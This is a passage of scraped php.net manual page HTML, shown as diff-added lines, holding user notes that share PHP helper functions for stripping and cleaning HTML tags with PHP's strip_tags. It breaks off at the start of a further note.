+<strong class="user"><em>cesar at nixar dot org</em></strong></a><a class="genanchor" href="#62705"> &para;</a><div class="date" title="2006-03-07 11:44"><strong>9 years ago</strong></div>
+<div class="text" id="Hcom62705">
+<div class="phpcode"><code><span class="html">
+Here is a recursive function for strip_tags like the one showed in the stripslashes manual page.<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">function </span><span class="default">strip_tags_deep</span><span class="keyword">(</span><span class="default">$value</span><span class="keyword">)<br />{<br />&nbsp; return </span><span class="default">is_array</span><span class="keyword">(</span><span class="default">$value</span><span class="keyword">) ?<br />&nbsp; &nbsp; </span><span class="default">array_map</span><span class="keyword">(</span><span class="string">'strip_tags_deep'</span><span class="keyword">, </span><span class="default">$value</span><span class="keyword">) :<br />&nbsp; &nbsp; </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$value</span><span class="keyword">);<br />}<br /><br /></span><span class="comment">// Example<br /></span><span class="default">$array </span><span class="keyword">= array(</span><span class="string">'&lt;b&gt;Foo&lt;/b&gt;'</span><span class="keyword">, </span><span class="string">'&lt;i&gt;Bar&lt;/i&gt;'</span><span class="keyword">, array(</span><span class="string">'&lt;b&gt;Foo&lt;/b&gt;'</span><span class="keyword">, </span><span class="string">'&lt;i&gt;Bar&lt;/i&gt;'</span><span class="keyword">));<br /></span><span class="default">$array </span><span class="keyword">= </span><span class="default">strip_tags_deep</span><span class="keyword">(</span><span class="default">$array</span><span class="keyword">);<br /><br /></span><span class="comment">// Output<br /></span><span class="default">print_r</span><span class="keyword">(</span><span class="default">$array</span><span class="keyword">);<br /></span><span class="default">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="99643"> <div class="votes">
+<div id="Vu99643">
+<a href="http://php.net/manual/vote-note.php?id=99643&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd99643">
+<a href="http://php.net/manual/vote-note.php?id=99643&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V99643" title="48% like this...">
+    -1
+    </div>
+</div>
+<a href="#99643" class="name">
+<strong class="user"><em>tom at cowin dot us</em></strong></a><a class="genanchor" href="#99643"> &para;</a><div class="date" title="2010-08-27 07:04"><strong>5 years ago</strong></div>
+<div class="text" id="Hcom99643">
+<div class="phpcode"><code><span class="html">
+With most web based user input of more than a line of text, it seems I get 90% 'paste from Word'. I've developed this fn over time to try to strip all of this cruft out. A few things I do here are application specific, but if it helps you - great, if you can improve on it or have a better way - please - post it... <br /> <br /><span class="default">&lt;?php<br /> <br />&nbsp; &nbsp; </span><span class="keyword">function </span><span class="default">strip_word_html</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">$allowed_tags </span><span class="keyword">= </span><span class="string">'&lt;b&gt;&lt;i&gt;&lt;sup&gt;&lt;sub&gt;&lt;em&gt;&lt;strong&gt;&lt;u&gt;&lt;br&gt;'</span><span class="keyword">)<br />&nbsp; &nbsp; {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">mb_regex_encoding</span><span class="keyword">(</span><span class="string">'UTF-8'</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">//replace MS special characters first<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$search </span><span class="keyword">= array(</span><span class="string">'/&amp;lsquo;/u'</span><span class="keyword">, </span><span class="string">'/&amp;rsquo;/u'</span><span class="keyword">, </span><span class="string">'/&amp;ldquo;/u'</span><span class="keyword">, </span><span class="string">'/&amp;rdquo;/u'</span><span class="keyword">, </span><span class="string">'/&amp;mdash;/u'</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$replace </span><span class="keyword">= array(</span><span class="string">'\''</span><span class="keyword">, </span><span class="string">'\''</span><span class="keyword">, </span><span class="string">'"'</span><span class="keyword">, </span><span class="string">'"'</span><span class="keyword">, </span><span class="string">'-'</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="default">$search</span><span class="keyword">, </span><span class="default">$replace</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">//make sure _all_ html entities are converted to the plain ascii equivalents - it appears<br />&nbsp; &nbsp; &nbsp; &nbsp; //in some MS headers, some html entities are encoded and some aren't<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">html_entity_decode</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">ENT_QUOTES</span><span class="keyword">, </span><span class="string">'UTF-8'</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">//try to strip out any C style comments first, since these, embedded in html comments, seem to<br />&nbsp; &nbsp; &nbsp; &nbsp; //prevent strip_tags from removing html comments (MS Word introduced combination)<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="keyword">if(</span><span class="default">mb_stripos</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="string">'/*'</span><span class="keyword">) !== </span><span class="default">FALSE</span><span class="keyword">){<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">mb_eregi_replace</span><span class="keyword">(</span><span class="string">'#/\*.*?\*/#s'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">, </span><span class="string">'m'</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">//introduce a space into any arithmetic expressions that could be caught by strip_tags so that they won't be<br />&nbsp; &nbsp; &nbsp; &nbsp; //'&lt;1' becomes '&lt; 1'(note: somewhat application specific)<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(array(</span><span class="string">'/&lt;([0-9]+)/'</span><span class="keyword">), array(</span><span class="string">'&lt; $1'</span><span class="keyword">), </span><span class="default">$text</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">strip_tags</span><span class="keyword">(</span><span class="default">$text</span><span class="keyword">, </span><span class="default">$allowed_tags</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">//eliminate extraneous whitespace from start and end of line, or anywhere there are two or more spaces, convert it to one<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(array(</span><span class="string">'/^\s\s+/'</span><span class="keyword">, </span><span class="string">'/\s\s+$/'</span><span class="keyword">, </span><span class="string">'/\s\s+/u'</span><span class="keyword">), array(</span><span class="string">''</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="string">' '</span><span class="keyword">), </span><span class="default">$text</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">//strip out inline css and simplify style tags<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$search </span><span class="keyword">= array(</span><span class="string">'#&lt;(strong|b)[^&gt;]*&gt;(.*?)&lt;/(strong|b)&gt;#isu'</span><span class="keyword">, </span><span class="string">'#&lt;(em|i)[^&gt;]*&gt;(.*?)&lt;/(em|i)&gt;#isu'</span><span class="keyword">, </span><span class="string">'#&lt;u[^&gt;]*&gt;(.*?)&lt;/u&gt;#isu'</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$replace </span><span class="keyword">= array(</span><span class="string">'&lt;b&gt;$2&lt;/b&gt;'</span><span class="keyword">, </span><span class="string">'&lt;i&gt;$2&lt;/i&gt;'</span><span class="keyword">, </span><span class="string">'&lt;u&gt;$1&lt;/u&gt;'</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="default">$search</span><span class="keyword">, </span><span class="default">$replace</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">//on some of the ?newer MS Word exports, where you get conditionals of the form 'if gte mso 9', etc., it appears<br />&nbsp; &nbsp; &nbsp; &nbsp; //that whatever is in one of the html comments prevents strip_tags from eradicating the html comment that contains<br />&nbsp; &nbsp; &nbsp; &nbsp; //some MS Style Definitions - this last bit gets rid of any leftover comments */<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$num_matches </span><span class="keyword">= </span><span class="default">preg_match_all</span><span class="keyword">(</span><span class="string">"/\&lt;!--/u"</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">, </span><span class="default">$matches</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; if(</span><span class="default">$num_matches</span><span class="keyword">){<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/\&lt;!--(.)*--\&gt;/isu'</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">, </span><span class="default">$text</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; return </span><span class="default">$text</span><span class="keyword">;<br />&nbsp; &nbsp; }<br /></span><span class="default">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="113209"> <div class="votes">
+<div id="Vu113209">
+<a href="http://php.net/manual/vote-note.php?id=113209&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd113209">
+<a href="http://php.net/manual/vote-note.php?id=113209&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V113209" title="44% like this...">
+    -2
+    </div>
+</div>
+<a href="#113209" class="name">
+<strong class="user"><em>mshaffer</em></strong></a><a class="genanchor" href="#113209"> &para;</a><div class="date" title="2013-09-12 04:01"><strong>2 years ago</strong></div>
+<div class="text" id="Hcom113209">
+<div class="phpcode"><code><span class="html">
+Below was a note on "strip_tags" page that got removed off of PHP.net ... I found this note useful, and use the code in parsing before "stripping tags" ... I don't know why in the world you would delete this one, but keep others ... your review system is a bit disturbing ...<br /><br />On your page you have a warning about how data may be lost, but you delete a user-contributed comment that helps prevent that?<br /><br />======================<br /><br />aleksey at favor dot com dot ua 24-Feb-2011 01:06<br /><br />strip_tags destroys the whole HTML behind the tags with invalid attributes. Like &lt;img src="/images/image.jpg""&gt; (look, there is an odd quote before &gt;.) <br /><br />So I wrote function which fixes unsafe attributes and replaces odd " and ' quotes with &amp;quot; and &amp;#39;. <br /><br /><span class="default">&lt;?php <br /></span><span class="keyword">function </span><span class="default">fix_unsafe_attributes</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">) { <br />&nbsp; </span><span class="default">$out </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">; <br />&nbsp; while (</span><span class="default">preg_match</span><span class="keyword">(</span><span class="string">'/&lt;([A-Za-z])[^&gt;]*?&gt;/'</span><span class="keyword">, </span><span class="default">$s</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">, </span><span class="default">PREG_OFFSET_CAPTURE</span><span class="keyword">)) { </span><span class="comment">// find where the tag begins <br />&nbsp; &nbsp; </span><span class="default">$i </span><span class="keyword">= </span><span class="default">$i</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">][</span><span class="default">1</span><span class="keyword">]+</span><span class="default">1</span><span class="keyword">; <br />&nbsp; &nbsp; </span><span class="default">$out</span><span class="keyword">.= </span><span class="default">substr</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">0</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">); <br />&nbsp; &nbsp; </span><span class="default">$s </span><span class="keyword">= </span><span class="default">substr</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">); <br /><br />&nbsp; &nbsp; </span><span class="comment">// scan attributes and find odd " and ' <br />&nbsp; &nbsp; </span><span class="keyword">while ((((</span><span class="default">$i1 </span><span class="keyword">= </span><span class="default">strpos</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="string">'"'</span><span class="keyword">)) || </span><span class="default">1</span><span class="keyword">) &amp;&amp; ((</span><span class="default">$i2 </span><span class="keyword">= </span><span class="default">strpos</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="string">'\''</span><span class="keyword">)) || </span><span class="default">1</span><span class="keyword">)) &amp;&amp; (</span><span class="default">$i1 </span><span class="keyword">!== </span><span class="default">false </span><span class="keyword">|| </span><span class="default">$i2 </span><span class="keyword">!== </span><span class="default">false</span><span class="keyword">) &amp;&amp; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; ((</span><span class="default">$i </span><span class="keyword">= (int)((</span><span class="default">$i1 </span><span class="keyword">!== </span><span class="default">false</span><span class="keyword">) &amp;&amp; (</span><span class="default">$i2 </span><span class="keyword">!== </span><span class="default">false</span><span class="keyword">) ? (</span><span class="default">$i1 </span><span class="keyword">&lt; </span><span class="default">$i2 </span><span class="keyword">? </span><span class="default">$i1 </span><span class="keyword">: </span><span class="default">$i2</span><span class="keyword">) : (</span><span class="default">$i1 </span><span class="keyword">== </span><span class="default">false </span><span class="keyword">? </span><span class="default">$i2 </span><span class="keyword">: </span><span class="default">$i1</span><span class="keyword">))) !== </span><span class="default">false</span><span class="keyword">) &amp;&amp; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; (((</span><span class="default">$c </span><span class="keyword">= </span><span class="default">strpos</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="string">'&gt;'</span><span class="keyword">)) === </span><span class="default">false</span><span class="keyword">) || (</span><span class="default">$i </span><span class="keyword">&lt; </span><span class="default">$c</span><span class="keyword">))) { <br /><br />&nbsp; &nbsp; &nbsp; </span><span class="default">$c </span><span class="keyword">= </span><span class="default">$s</span><span class="keyword">{</span><span class="default">$i</span><span class="keyword">}; <br />&nbsp; &nbsp; &nbsp; if ((</span><span class="default">$i </span><span class="keyword">&lt; </span><span class="default">1</span><span class="keyword">) || (</span><span class="default">$s</span><span class="keyword">{</span><span class="default">$i</span><span class="keyword">-</span><span class="default">1</span><span class="keyword">} != </span><span class="string">'='</span><span class="keyword">)) { <br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out</span><span class="keyword">.= </span><span class="default">substr</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">0</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">).(</span><span class="default">$s</span><span class="keyword">{</span><span class="default">$i</span><span class="keyword">} == </span><span class="string">'"' </span><span class="keyword">? </span><span class="string">'&amp;quot;' </span><span class="keyword">: </span><span class="string">'&amp;#39;'</span><span class="keyword">); </span><span class="comment">// replace odd " and ' <br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$s </span><span class="keyword">= </span><span class="default">substr</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">+</span><span class="default">1</span><span class="keyword">); <br />&nbsp; &nbsp; &nbsp; }else { <br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$i</span><span class="keyword">++; <br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out</span><span class="keyword">.= </span><span class="default">substr</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">0</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">); <br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$s </span><span class="keyword">= </span><span class="default">substr</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">); <br /><br />&nbsp; &nbsp; &nbsp; &nbsp; if ((</span><span class="default">$i </span><span class="keyword">= </span><span class="default">strpos</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">$c</span><span class="keyword">)) !== </span><span class="default">false</span><span class="keyword">) { <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$i</span><span class="keyword">++; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out</span><span class="keyword">.= </span><span class="default">substr</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">0</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">); <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$s </span><span class="keyword">= </span><span class="default">substr</span><span class="keyword">(</span><span class="default">$s</span><span class="keyword">, </span><span class="default">$i</span><span class="keyword">); <br />&nbsp; &nbsp; &nbsp; &nbsp; } <br />&nbsp; &nbsp; &nbsp; } <br />&nbsp; &nbsp; } <br />&nbsp; } <br />&nbsp; return </span><span class="default">$out</span><span class="keyword">.</span><span class="default">$s</span><span class="keyword">; <br />} <br /></span><span class="default">?&gt;</span> <br /><br />Maybe this function can be rewritten with simple regular expression but I have no luck to make it quickly.</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="113761"> <div class="votes">
+<div id="Vu113761">
+<a href="http://php.net/manual/vote-note.php?id=113761&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd113761">
+<a href="http://php.net/manual/vote-note.php?id=113761&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V113761" title="41% like this...">
+    -2
+    </div>
+</div>
+<a href="#113761" class="name">
+<strong class="user"><em>sERGE-01</em></strong></a><a class="genanchor" href="#113761"> &para;</a><div class="date" title="2013-11-28 11:03"><strong>2 years ago</strong></div>
+<div class="text" id="Hcom113761">
+<div class="phpcode"><code><span class="html">
+Fix for my Example2. <br />If the text does not have allowed tags, $out_text is empty. Fix:<br /><br /><span class="default">&lt;?php<br />&nbsp; &nbsp; $out_text </span><span class="keyword">= </span><span class="string">""</span><span class="keyword">;<br />&nbsp; &nbsp; </span><span class="default">$ofs </span><span class="keyword">= </span><span class="default">0</span><span class="keyword">;<br />&nbsp; &nbsp; if(</span><span class="default">preg_match_all</span><span class="keyword">(</span><span class="string">'#&lt;/?('</span><span class="keyword">.</span><span class="default">$tags_allowed</span><span class="keyword">.</span><span class="string">')\b([^&gt;&lt;]*&gt;)#sim'</span><span class="keyword">, </span><span class="default">$in_text</span><span class="keyword">, </span><span class="default">$matches</span><span class="keyword">, </span><span class="default">PREG_OFFSET_CAPTURE</span><span class="keyword">))<br />&nbsp; &nbsp; {<br />&nbsp; &nbsp; &nbsp; &nbsp; foreach(</span><span class="default">$matches</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">] as </span><span class="default">$tag</span><span class="keyword">)<br />&nbsp; &nbsp; &nbsp; &nbsp; {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out_text </span><span class="keyword">.= </span><span class="default">htmlentities</span><span class="keyword">(</span><span class="default">substr</span><span class="keyword">(</span><span class="default">$in_text</span><span class="keyword">, </span><span class="default">$ofs</span><span class="keyword">, </span><span class="default">$tag</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">] - </span><span class="default">$ofs</span><span class="keyword">), </span><span class="default">ENT_NOQUOTES</span><span class="keyword">, </span><span class="string">"cp1251"</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out_text </span><span class="keyword">.= </span><span class="default">$tag</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">];<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$ofs </span><span class="keyword">= </span><span class="default">$tag</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">] + </span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$tag</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; }<br />&nbsp; &nbsp; </span><span class="default">$out_text </span><span class="keyword">.= </span><span class="default">htmlentities</span><span class="keyword">(</span><span class="default">substr</span><span class="keyword">(</span><span class="default">$in_text</span><span class="keyword">, </span><span class="default">$ofs</span><span class="keyword">), </span><span class="default">ENT_NOQUOTES</span><span class="keyword">, </span><span class="string">"cp1251"</span><span class="keyword">); </span><span class="comment">// end of text<br /></span><span class="default">?&gt;</span>
+</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="115167"> <div class="votes">
+<div id="Vu115167">
+<a href="http://php.net/manual/vote-note.php?id=115167&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd115167">
+<a href="http://php.net/manual/vote-note.php?id=115167&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V115167" title="37% like this...">
+    -2
+    </div>
+</div>
+<a href="#115167" class="name">
+<strong class="user"><em>pietro777</em></strong></a><a class="genanchor" href="#115167"> &para;</a><div class="date" title="2014-06-06 08:20"><strong>1 year ago</strong></div>
+<div class="text" id="Hcom115167">
+<div class="phpcode"><code><span class="html">
+$data = '&lt;br&gt;Each&lt;br/&gt;New&lt;br /&gt;Line'; <br />$new&nbsp; = strip_tags($data, '&lt;br /&gt;||&lt;br/&gt;||&lt;br&gt;'); <br />var_dump($new); // OUTPUTS string(11) "&lt;br&gt;Each&lt;br/&gt;New&lt;br /&gt;Line"</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="113759"> <div class="votes">
+<div id="Vu113759">
+<a href="http://php.net/manual/vote-note.php?id=113759&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd113759">
+<a href="http://php.net/manual/vote-note.php?id=113759&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V113759" title="36% like this...">
+    -3
+    </div>
+</div>
+<a href="#113759" class="name">
+<strong class="user"><em>sERGE-01</em></strong></a><a class="genanchor" href="#113759"> &para;</a><div class="date" title="2013-11-28 09:43"><strong>2 years ago</strong></div>
+<div class="text" id="Hcom113759">
+<div class="phpcode"><code><span class="html">
+My strip_tags:<br /><br />1) Simple removal of all disallowed tags. Broken tags remain unchanged:<br /><span class="default">&lt;?php<br />&nbsp; &nbsp; $tags_allowed </span><span class="keyword">= </span><span class="string">"a|b|i|s|u|br"</span><span class="keyword">;<br />&nbsp; &nbsp; </span><span class="default">$in_text </span><span class="keyword">= </span><span class="string">"&lt;b&gt;Bold&lt;/b&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Table&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;&lt;i&gt;Italic&gt;&gt;&lt;/i&gt;&lt;div&gt;Div&lt;/div&gt;"</span><span class="keyword">;<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; </span><span class="default">$out_text </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'#&lt;/?(?!('</span><span class="keyword">.</span><span class="default">$tags_allowed</span><span class="keyword">.</span><span class="string">'))\b([^&gt;&lt;]*&gt;)#sim'</span><span class="keyword">, </span><span class="string">""</span><span class="keyword">, </span><span class="default">$in_text</span><span class="keyword">);<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; print </span><span class="string">"Example 1:&lt;br&gt;"</span><span class="keyword">;<br />&nbsp; &nbsp; print </span><span class="default">htmlentities</span><span class="keyword">(</span><span class="default">$out_text</span><span class="keyword">).</span><span class="string">"&lt;br&gt;"</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span>-------------------------------<br />Example 1:<br />&lt;b&gt;Bold&lt;/b&gt;Table&lt;br&gt;&lt;i&gt;Italic&gt;&gt;&lt;/i&gt;Div<br />-------------------------------<br /><br />2) This example leaves all allowed tags and screen the rest of the text with&nbsp; htmlentities() function:<br /><span class="default">&lt;?php<br />&nbsp; &nbsp; </span><span class="comment">// getting all of allowed tags with their offset<br />&nbsp; &nbsp; </span><span class="keyword">if(</span><span class="default">preg_match_all</span><span class="keyword">(</span><span class="string">'#&lt;/?('</span><span class="keyword">.</span><span class="default">$tags_allowed</span><span class="keyword">.</span><span class="string">')\b([^&gt;&lt;]*&gt;)#sim'</span><span class="keyword">, </span><span class="default">$in_text</span><span class="keyword">, </span><span class="default">$matches</span><span class="keyword">, </span><span class="default">PREG_OFFSET_CAPTURE</span><span class="keyword">))<br />&nbsp; &nbsp; {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out_text </span><span class="keyword">= </span><span class="string">""</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$ofs </span><span class="keyword">= </span><span class="default">0</span><span class="keyword">;<br />&nbsp; &nbsp; &nbsp; &nbsp; foreach(</span><span class="default">$matches</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">] as </span><span class="default">$tag</span><span class="keyword">)<br />&nbsp; &nbsp; &nbsp; &nbsp; {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">// text before allowed tag<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out_text </span><span class="keyword">.= </span><span class="default">htmlentities</span><span class="keyword">(</span><span class="default">substr</span><span class="keyword">(</span><span class="default">$in_text</span><span class="keyword">,</span><span class="default">$ofs</span><span class="keyword">,</span><span class="default">$tag</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]-</span><span class="default">$ofs</span><span class="keyword">), </span><span class="default">ENT_NOQUOTES</span><span class="keyword">, </span><span class="string">"cp1251"</span><span class="keyword">); <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out_text </span><span class="keyword">.= </span><span class="default">$tag</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]; </span><span class="comment">// next allowed tag<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$ofs </span><span class="keyword">= </span><span class="default">$tag</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">] + </span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$tag</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="comment">// adding end of text<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$out_text </span><span class="keyword">.= </span><span class="default">htmlentities</span><span class="keyword">(</span><span class="default">substr</span><span class="keyword">(</span><span class="default">$in_text</span><span class="keyword">, </span><span class="default">$ofs</span><span class="keyword">), </span><span class="default">ENT_NOQUOTES</span><span class="keyword">, </span><span class="string">"cp1251"</span><span class="keyword">); <br />&nbsp; &nbsp; }<br /><br />&nbsp; &nbsp; print </span><span class="string">"Example 2:&lt;br&gt;"</span><span class="keyword">;<br />&nbsp; &nbsp; print </span><span class="default">htmlentities</span><span class="keyword">(</span><span class="default">$out_text</span><span class="keyword">).</span><span class="string">"&lt;br&gt;"</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span>-------------------------------<br />Example 2:<br />&lt;b&gt;Bold&lt;/b&gt;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Table&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&lt;br&gt;<br />&lt;i&gt;Italic&amp;gt;&amp;gt;&lt;/i&gt;&amp;lt;div&amp;gt;Div&amp;lt;/div&amp;gt;<br />-------------------------------</span>
+</code></div>
+</div>
+</div>
+<div class="note" id="61834"> <div class="votes">
+<div id="Vu61834">
+<a href="http://php.net/manual/vote-note.php?id=61834&amp;page=function.strip-tags&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
+</div>
+<div id="Vd61834">
+<a href="http://php.net/manual/vote-note.php?id=61834&amp;page=function.strip-tags&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
+</div>
+<div class="tally" id="V61834" title="36% like this...">
+    -5
+    </div>
+</div>
+<a href="#61834" class="name">
+<strong class="user"><em>salavert at~ akelos</em></strong></a><a class="genanchor" href="#61834"> &para;</a><div class="date" title="2006-02-13 02:21"><strong>9 years ago</strong></div>
+<div class="text" id="Hcom61834">
+<div class="phpcode"><code><span class="html">
